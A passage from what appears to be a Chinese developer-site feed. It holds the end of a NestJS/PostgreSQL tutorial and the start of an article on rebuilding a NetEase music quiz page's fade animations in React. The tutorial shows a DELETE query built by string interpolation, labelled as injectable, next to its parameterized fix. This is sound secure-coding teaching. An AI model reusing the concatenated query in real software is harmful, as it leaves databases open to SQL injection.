<p>🔑 <strong>重点来了：SQL 注入防护！</strong></p>
<p>❌ 错误写法（拼接 SQL）：</p>
<pre><code class="hljs language-ts" lang="ts">db.<span class="hljs-title function_">query</span>(<span class="hljs-string">`DELETE FROM todos WHERE id = <span class="hljs-subst">${id}</span>`</span>); <span class="hljs-comment">// 危险！可能被注入</span>
</code></pre>
<p>✅ 正确做法（参数化查询）：</p>
<pre><code class="hljs language-ts" lang="ts">db.<span class="hljs-title function_">query</span>(<span class="hljs-string">'DELETE FROM todos WHERE id = $1'</span>, [id]); <span class="hljs-comment">// 安全 ✔️</span>
</code></pre>
<blockquote>
<p><code>$1</code>, <code>$2</code> 是 PostgreSQL 占位符，配合参数数组使用，从根本上防止 SQL 注入攻击。</p>
</blockquote>
<hr/>
<h4 data-id="heading-12">5. 添加数据库健康检查接口</h4>
<p>方便调试连接是否正常：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/app.controller.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Controller</span>, <span class="hljs-title class_">Get</span>, <span class="hljs-title class_">Inject</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;

<span class="hljs-meta">@Controller</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppController</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-meta">@Inject</span>(<span class="hljs-string">'PG_CONNECTION'</span>) <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> db: <span class="hljs-built_in">any</span></span>) {}

  <span class="hljs-meta">@Get</span>(<span class="hljs-string">'db-test'</span>)
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">testDb</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">db</span>.<span class="hljs-title function_">query</span>(<span class="hljs-string">'SELECT 1'</span>);
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">status</span>: <span class="hljs-string">'✅ 数据库连接成功！'</span> };
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">status</span>: <span class="hljs-string">'❌ 连接失败'</span>, <span class="hljs-attr">error</span>: err.<span class="hljs-property">message</span> };
    }
  }
}
</code></pre>
<p>访问 <code>/db-test</code> 即可看到连接状态。</p>
<hr/>
<h3 data-id="heading-13">五、总结 &amp; 下一步进阶建议（冲榜加分项！）</h3>
<p>你已经完成了以下关键能力构建：</p>
<p>✅ 搭建 NestJS 工程骨架<br/>
✅ 理解模块化架构设计<br/>
✅ 实现依赖注入与全局模块封装<br/>
✅ 安全地操作 PostgreSQL 数据库<br/>
✅ 掌握装饰器、管道、参数化查询等核心语法</p>
<hr/>
<h4 data-id="heading-14">🚀 掘金读者关心的“下一步怎么做”？</h4>





























<table><thead><tr><th>目标</th><th>推荐方案</th></tr></thead><tbody><tr><td>更高效写数据库</td><td>使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Ftypeorm.io%2F" target="_blank" title="https://typeorm.io/" ref="nofollow noopener noreferrer">TypeORM</a> 或 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.prisma.io%2F" target="_blank" title="https://www.prisma.io/" ref="nofollow noopener noreferrer">Prisma</a>，告别手写 SQL</td></tr><tr><td>请求校验自动化</td><td>引入 <code>class-validator</code> + <code>ValidationPipe</code>，自动拦截非法输入</td></tr><tr><td>统一错误响应</td><td>使用 <code>@UseFilters()</code> + <code>HttpExceptionFilter</code> 全局捕获异常</td></tr><tr><td>自动生成文档</td><td>集成 <code>@nestjs/swagger</code>，一键生成 API 文档页面</td></tr><tr><td>提升开发体验</td><td>使用 DTO 分离数据传输对象，增强类型提示</td></tr></tbody></table>
<hr/>
<h4 data-id="heading-15">💬 最后说一句真心话</h4>
<blockquote>
<p><strong>NestJS 不只是一个框架，更是一种编程思维的升级。</strong></p>
</blockquote>
<p>当你开始用“模块”组织功能、“服务”封装逻辑、“注入”管理依赖时，你就已经脱离了“脚本小子”的阶段，迈向真正的<strong>工程化开发</strong>。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[营销活动从“能跑”到“丝滑”的进化]]></title>    <link>https://juejin.cn/post/7596906473306046514</link>    <guid>https://juejin.cn/post/7596906473306046514</guid>    <pubDate>2026-01-19T10:51:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906473306046514" data-draft-id="7595466990111572008" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="营销活动从“能跑”到“丝滑”的进化"/> <meta itemprop="keywords" content="前端,JavaScript,CSS"/> <meta itemprop="datePublished" content="2026-01-19T10:51:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Mh"/> <meta itemprop="url" content="https://juejin.cn/user/712139267641950"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            营销活动从“能跑”到“丝滑”的进化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139267641950/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Mh
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T10:51:51.000Z" title="Mon Jan 19 2026 10:51:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在日常的开发过程中，我们常常需要复刻某些经典的需求———— 既要高度还原优质的交互体验，又要适配不同的业务场景。比如：最近公司让我做一个德国冬季口味营销活动，具体的交互参考网易云七夕营销活动，由于公司的代码是nuxt实现的并支持外网访问，所有我打算用react重新复现一下这个活动（素材使用网易云的七夕活动中的素材）。本文将从技术角度拆解复刻过程中的核心思路和踩坑经验。</p>
<h2 data-id="heading-1">网易云七夕活动页面</h2>
<p>这里是网易云七夕活动页面原地址 <a href="https://link.juejin.cn?target=https%3A%2F%2Fy.music.163.com%2Fg%2Fyida%2F2024love%2FC_g607j64ar2%3Fapp_version%3D9.4.05%26dlt%3D0846%26userid%3D1810128822%26page%3D1ba8b6833ac04d0890e9d5baefca24b4" target="_blank" title="https://y.music.163.com/g/yida/2024love/C_g607j64ar2?app_version=9.4.05&amp;dlt=0846&amp;userid=1810128822&amp;page=1ba8b6833ac04d0890e9d5baefca24b4" ref="nofollow noopener noreferrer">网易云七夕活动</a> 供大家进行参考，本次主要聚焦的是<strong>问答活动模块</strong>的内容，对于结果页面暂不进行开发，如有侵权和冒犯之处，敬请谅解。</p>
<h2 data-id="heading-2">技术拆解</h2>
<p>在整个复刻七夕活动的过程中，最核心的难点在于：<strong>如何大量高清图片切换的过程中，保持动画的连贯性且不会卡顿？</strong></p>
<h2 data-id="heading-3">初版</h2>
<p><strong>定位：快速实现功能原型，但存在明显的性能和体验瓶颈。</strong></p>
<p>核心代码展示</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">Index</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [currentStep, setCurrentStep] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleBeginTesting</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setCurrentStep</span>(<span class="hljs-number">1</span>);
  };

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleAnsweringQuestion</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setCurrentStep</span>(<span class="hljs-function"><span class="hljs-params">a</span> =&gt;</span> a + <span class="hljs-number">1</span>);
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"first-edition-container"</span>&gt;</span>
      {questionList.map((item, index) =&gt; {
        return (
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
            <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`<span class="hljs-attr">step-content</span> <span class="hljs-attr">step</span>${<span class="hljs-attr">index</span>} ${<span class="hljs-attr">currentStep</span> !== <span class="hljs-string">index</span> ? '<span class="hljs-attr">fade-item</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">fade-enter-done</span>'}`}
            <span class="hljs-attr">key</span>=<span class="hljs-string">{index}</span>
          &gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"image-bg"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{item.imgSrc}</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span> /&gt;</span>
            {index === 0 &amp;&amp; (
              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleBeginTesting}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"begin-testing"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            )}
            {!!item.question1 &amp;&amp; (
              <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
                <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleAnsweringQuestion}</span>
                <span class="hljs-attr">className</span>=<span class="hljs-string">"question question1"</span>
                <span class="hljs-attr">src</span>=<span class="hljs-string">{item.question1}</span>
                <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
              /&gt;</span>
            )}
            {!!item.question2 &amp;&amp; (
              <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
                <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleAnsweringQuestion}</span>
                <span class="hljs-attr">className</span>=<span class="hljs-string">"question question2"</span>
                <span class="hljs-attr">src</span>=<span class="hljs-string">{item.question2}</span>
                <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
              /&gt;</span>
            )}
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        );
      })}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 动画部分</span>
<span class="hljs-selector-class">.first-edition-container</span> <span class="hljs-selector-class">.fade-item</span> {
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;
  -webkit-<span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  -o-<span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  -moz-<span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">10</span>;
}

<span class="hljs-selector-class">.first-edition-container</span> <span class="hljs-selector-class">.fade-enter-done</span> {
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>;
  -webkit-<span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  -o-<span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  -moz-<span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;
}
</code></pre>
<h4 data-id="heading-4">以下是初版的详细代码分析：</h4>
<p><strong>1. 核心逻辑</strong></p>
<ul>
<li>
<p>全量挂载：通过 questionList.map 一次性将所有题目渲染到 DOM 树中。</p>
</li>
<li>
<p>状态切换：仅依靠一个 currentStep 变量，配合 CSS 类名（fade-item vs fade-enter-done）来控制题目的显示与隐藏。</p>
</li>
<li>
<p>逻辑简单：函数组件内部只有最基础的 useState，没有复杂的生命周期管理</p>
</li>
</ul>
<p><strong>2. 缺陷</strong></p>
<ul>
<li>
<p>首屏渲染压力较大： 由于采用全量渲染模式，网站一打开加载所有的图片资源，在弱网的情况下，可能会导致首屏加载时间过长，白屏等情况。</p>
</li>
<li>
<p>缺乏动画的精细度：代码中仅通过简单的类名去控制 opacity 的变化，在网易云的原版交互中，背景图、问题1、问题2是由先后顺序的阶梯式淡入。</p>
</li>
</ul>
<h3 data-id="heading-5">初版--效果展示</h3>
<p><span href="https://code.juejin.cn/pen/7595789985958068250" class="code-editor-container"><iframe class="code-editor-frame" data-code="code-editor-element" data-code-id="7595789985958068250" data-src="https://code.juejin.cn/pen/7595789985958068250" style="display:none;" loading="lazy"/><span class="loading-placeholder" style="display:none"><img class="placeholder-image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAJElEQVRoge3BMQEAAADCoPVP7WkJoAAAAAAAAAAAAAAAAAAAbjh8AAFte11jAAAAAElFTkSuQmCC" loading="lazy"/><span class="loading-logo"/></span></span></p>
<h2 data-id="heading-6">进阶版</h2>
<p>定位：<strong>从“简单的 UI 切换”转向了“精细化交互控制”</strong>。</p>
<p>核心代码展示</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">StepItem</span> = (<span class="hljs-params">{ item, index, isActive, onBegin, onAnswer }</span>) =&gt; {
  <span class="hljs-comment">// 动画状态</span>
  <span class="hljs-keyword">const</span> [imageOpacity, setImageOpacity] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> [question1Opacity, setQuestion1Opacity] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> [question2Opacity, setQuestion2Opacity] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-comment">// 图片加载完成标志</span>
  <span class="hljs-keyword">const</span> [imageLoaded, setImageLoaded] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);

  <span class="hljs-comment">// 动画完成标志</span>
  <span class="hljs-keyword">const</span> imageAnimationDone = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> question1AnimationDone = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">false</span>);

  <span class="hljs-comment">// 当组件变为激活状态时开始动画</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (isActive) {
      <span class="hljs-comment">// 重置动画状态</span>
      <span class="hljs-title function_">setImageOpacity</span>(<span class="hljs-number">0</span>);
      <span class="hljs-title function_">setQuestion1Opacity</span>(<span class="hljs-number">0</span>);
      <span class="hljs-title function_">setQuestion2Opacity</span>(<span class="hljs-number">0</span>);
      imageAnimationDone.<span class="hljs-property">current</span> = <span class="hljs-literal">false</span>;
      question1AnimationDone.<span class="hljs-property">current</span> = <span class="hljs-literal">false</span>;
    }
  }, [isActive]);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">let</span> question1Timer = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">let</span> question2Timer = <span class="hljs-literal">null</span>;

    <span class="hljs-comment">// 如果状态未激活或者图片没有加载完成直接终止</span>
    <span class="hljs-keyword">if</span> (!isActive || !imageLoaded) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">runImageAnimation</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-title function_">setImageOpacity</span>(<span class="hljs-number">1</span>);
      imageAnimationDone.<span class="hljs-property">current</span> = <span class="hljs-literal">true</span>;
    };

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">runQuestion1Animation</span> = (<span class="hljs-params"/>) =&gt; {
      question1Timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">if</span> (!item.<span class="hljs-property">question1</span>) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 无question1 → 终止</span>
        <span class="hljs-title function_">setQuestion1Opacity</span>(<span class="hljs-number">1</span>);
        question1AnimationDone.<span class="hljs-property">current</span> = <span class="hljs-literal">true</span>;
        <span class="hljs-title function_">runQuestion2Animation</span>(); <span class="hljs-comment">// 执行完question1，再执行question2</span>
      }, <span class="hljs-number">500</span>);
    };

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">runQuestion2Animation</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (!item.<span class="hljs-property">question2</span>) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 无question2 → 终止</span>
      question2Timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">setQuestion2Opacity</span>(<span class="hljs-number">1</span>);
      }, <span class="hljs-number">500</span>);
    };

    <span class="hljs-comment">// 执行图片动画</span>
    <span class="hljs-title function_">runImageAnimation</span>();
    <span class="hljs-comment">// 执行问题1动画</span>
    <span class="hljs-title function_">runQuestion1Animation</span>();

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-built_in">clearTimeout</span>(question1Timer);
      <span class="hljs-built_in">clearTimeout</span>(question2Timer);
    };
  }, [isActive, imageLoaded, item.<span class="hljs-property">question1</span>, item.<span class="hljs-property">question2</span>]);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>
      <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`<span class="hljs-attr">step-content</span> <span class="hljs-attr">step</span>${<span class="hljs-attr">index</span>} ${<span class="hljs-attr">isActive</span> ? '<span class="hljs-attr">fade-enter-done</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">fade-item</span>'}`}
    &gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
        <span class="hljs-attr">className</span>=<span class="hljs-string">"image-bg"</span>
        <span class="hljs-attr">src</span>=<span class="hljs-string">{item.imgSrc}</span>
        <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
        <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">imageOpacity</span> }}
        <span class="hljs-attr">onLoad</span>=<span class="hljs-string">{()</span> =&gt;</span> setImageLoaded(true)}
      /&gt;
      {index === 0 &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onBegin}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"begin-testing"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}
      {!!item.question1 &amp;&amp; (
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onAnswer}</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">"question question1"</span>
          <span class="hljs-attr">src</span>=<span class="hljs-string">{item.question1}</span>
          <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">question1Opacity</span> }}
        /&gt;</span>
      )}
      {!!item.question2 &amp;&amp; (
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onAnswer}</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">"question question2"</span>
          <span class="hljs-attr">src</span>=<span class="hljs-string">{item.question2}</span>
          <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">question2Opacity</span> }}
        /&gt;</span>
      )}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">Index</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [currentStep, setCurrentStep] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleBeginTesting</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setCurrentStep</span>(<span class="hljs-number">1</span>);
  };

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleAnsweringQuestion</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setCurrentStep</span>(<span class="hljs-function"><span class="hljs-params">a</span> =&gt;</span> a + <span class="hljs-number">1</span>);
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"second-edition-container"</span>&gt;</span>
      {questionList.map((item, index) =&gt; {
        return (
          <span class="hljs-tag">&lt;<span class="hljs-name">StepItem</span>
            <span class="hljs-attr">key</span>=<span class="hljs-string">{index}</span>
            <span class="hljs-attr">item</span>=<span class="hljs-string">{item}</span>
            <span class="hljs-attr">index</span>=<span class="hljs-string">{index}</span>
            <span class="hljs-attr">isActive</span>=<span class="hljs-string">{currentStep</span> === <span class="hljs-string">index}</span>
            <span class="hljs-attr">onBegin</span>=<span class="hljs-string">{handleBeginTesting}</span>
            <span class="hljs-attr">onAnswer</span>=<span class="hljs-string">{handleAnsweringQuestion}</span>
          /&gt;</span>
        );
      })}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 动画部分</span>
<span class="hljs-selector-class">.second-edition-container</span> <span class="hljs-selector-class">.fade-item</span> {
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">10</span>;
}

<span class="hljs-selector-class">.second-edition-container</span> <span class="hljs-selector-class">.fade-enter-done</span> {
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;
}
</code></pre>
<h4 data-id="heading-7">以下是进阶版的详细代码分析：</h4>
<p><strong>1. 核心改进：时序控制动画</strong></p>
<ul>
<li>通过 setTimeout 链式调用，模拟了网易云原版中素材错落有致的入场效果。</li>
</ul>
<p><strong>2. 引入图片加载监测</strong></p>
<ul>
<li>初版中动画是随 DOM 挂载直接触发的，而进阶版增加了 imageLoaded 状态，通过 onLoad 事件确保图片资源真实下载完成后才启动透明度动画。</li>
</ul>
<p><strong>3. 组件化拆分</strong></p>
<ul>
<li>将每一道题逻辑封装在 StepItem 中，每个 StepItem 维护自己的 opacity 状态，逻辑互不干扰，父组件只负责维护 currentStep 进度，职责单一化。</li>
</ul>
<p><strong>4. 存在的不足</strong></p>
<ul>
<li>性能瓶颈（全量渲染依然存在）： 虽然抽离了组件，但 Index 里依然在 map 全量渲染所有的 StepItem。</li>
</ul>
<h3 data-id="heading-8">进阶版--效果展示</h3>
<p><span href="https://code.juejin.cn/pen/7595792784619995162" class="code-editor-container"><iframe class="code-editor-frame" data-code="code-editor-element" data-code-id="7595792784619995162" data-src="https://code.juejin.cn/pen/7595792784619995162" style="display:none;" loading="lazy"/><span class="loading-placeholder" style="display:none"><img class="placeholder-image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAJElEQVRoge3BMQEAAADCoPVP7WkJoAAAAAAAAAAAAAAAAAAAbjh8AAFte11jAAAAAElFTkSuQmCC" loading="lazy"/><span class="loading-logo"/></span></span></p>
<h2 data-id="heading-9">最终版</h2>
